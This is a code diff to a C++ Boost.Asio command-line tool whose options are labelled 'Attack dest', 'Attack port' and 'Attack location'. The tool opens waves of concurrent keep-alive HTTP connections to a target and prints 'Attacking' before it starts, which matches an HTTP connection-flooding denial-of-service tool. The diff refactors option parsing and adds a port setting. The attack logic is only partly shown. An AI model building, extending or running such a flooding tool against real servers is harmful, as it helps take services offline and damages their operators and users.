@@ -10,13 +10,13 @@ using namespace asio;
 namespace po = boost::program_options;
 
 int concurrency, trunks, interval, expires;
-string host, path;
+string dest, port, location;
 
 class Request {
 public:
 	Request(io_service& io, int id) : id(id), count(0) {
 		timer = new deadline_timer(io, posix_time::seconds(interval));
-		stream = new ip::tcp::iostream(host, "http");
+		stream = new ip::tcp::iostream(dest, port);
 		start();
 	}
 	~Request() {
@@ -33,7 +33,7 @@ public:
 			"User-Agent: Boost.Asio\r\n"
 			"Accept: */*\r\n"
 			"Connection: Keep-Alive\r\n"
-		) % path % host;
+		) % location % dest;
 
 		stream->flush();
 		timer->expires_from_now(posix_time::seconds(interval));
@@ -90,12 +90,13 @@ void requestFactory(io_service* io, deadline_timer* timer, int id) {
 int main(int argc, char *argv[]) {
 	po::options_description desc("Options");
 	desc.add_options()
-		("dest,d", po::value<string>()->default_value("localhost"), "Attack dest")
-		("path,p", po::value<string>()->default_value("/"), "Attack path")
-		("concurrency,c", po::value<int>()->default_value(20), "Concurrency requests")
-		("trunks,t", po::value<int>()->default_value(10), "Trunks count")
-		("interval,i", po::value<int>()->default_value(5), "Interval between trunks")
-		("expires,e", po::value<int>()->default_value(5), "Expires for keep-alive connection")
+		("dest,d", po::value<string>(&dest)->default_value("localhost"), "Attack dest")
+		("port,p", po::value<string>(&port)->default_value("80"), "Attack port")
+		("location,l", po::value<string>(&location)->default_value("/"), "Attack location")
+		("concurrency,c", po::value<int>(&concurrency)->default_value(20), "Concurrency requests")
+		("trunks,t", po::value<int>(&trunks)->default_value(10), "Trunks count")
+		("interval,i", po::value<int>(&interval)->default_value(5), "Interval between trunks")
+		("expires,e", po::value<int>(&expires)->default_value(5), "Expires for keep-alive connection")
 		("help,h", "Show this help info");
 
 	po::variables_map vm;
@@ -107,13 +108,6 @@ int main(int argc, char *argv[]) {
 			return 1;
 		}
 		po::notify(vm);
-
-		host = vm["dest"].as<string>();
-		path = vm["path"].as<string>();
-		concurrency = vm["concurrency"].as<int>();
-		trunks = vm["trunks"].as<int>();
-		interval = vm["interval"].as<int>();
-		expires = vm["expires"].as<int>();
 	} catch(po::error& e) {
 		cerr << "Error: " << e.what() << endl << endl;
 		cout << desc << endl;
@@ -123,7 +117,7 @@ int main(int argc, char *argv[]) {
 	io_service io;
 	deadline_timer timer(io);
 
-	cout << format("Attacking %1%%2% with concurrency=%3%, trunks=%4%, interval=%5%, expires=%6%") % host % path % concurrency % trunks % interval % expires << endl << endl;
+	cout << format("Attacking %1%:%2% %3% with concurrency=%4%, trunks=%5%, interval=%6%, expires=%7%") % dest % port % location % concurrency % trunks % interval % expires << endl << endl;
 
 	requestFactory(&io, &timer, 0);
 	io.run();
